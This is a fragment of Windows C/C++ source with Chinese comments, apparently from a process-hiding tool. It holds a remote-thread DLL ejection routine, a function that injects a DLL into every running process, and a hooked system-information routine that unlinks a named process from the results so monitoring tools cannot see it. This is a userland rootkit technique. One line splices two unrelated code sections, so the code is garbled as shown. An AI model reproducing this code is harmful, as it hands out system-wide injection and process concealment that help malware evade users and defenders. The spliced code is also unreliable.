        }
        if (!bFound)
        {
            printf("Dll no found!\n");
            CloseHandle(hProcess);
            CloseHandle(hSnapshot);
            return FALSE;
        }
        pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FreeLibrary");
        hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, (LPVOID)me.modBaseAddr, 0, NULL);
        if (!hThread)
        {
            printf("Eject failed!\n");
            CloseHandle(hProcess);
            CloseHandle(hThread);
            return FALSE;
        }
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hSnapshot);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return TRUE;
    }
    BOOL InjectAllProcess(int nMode, LPCTSTR szDllPath) //统括管理注入函数与卸载函数，完成在每一个进程中注入或是卸载DLL
    {
        DWORD dwPID = 0;
        HANDLE hSnapshot = NULL;
        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
        if (!(hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL))) //拍摄所有进程的快照
        {
            printf("CreateToolhelp32Snapshot failed!\n");
            return FALSE;
        }
        Process32First(hSnapshot, &pe);
        do
        {
            dwPID = pe.th32ProcessID;
            if (dwPID Reserved2[1] != NULL)
                {
                    if (!_tcsicmp((PWSTR)pCur->Reserved2[1], PROC_TO_HIDE))
                    {
                        //当找到目标进程时有两种情况：1.下一个节点为0，也就是链表结束  2.下一个节点不为0
                        if (pCur->NextEntryOffset == 0)
                            pPrev->NextEntryOffset = 0; //直接把上一个节点的下一个成员值置为0
                        else
                            pPrev->NextEntryOffset += pCur->NextEntryOffset; //将上一个节点指向下一个节点的偏移加上当前节点指向下一个节点的偏移
                    }
                    else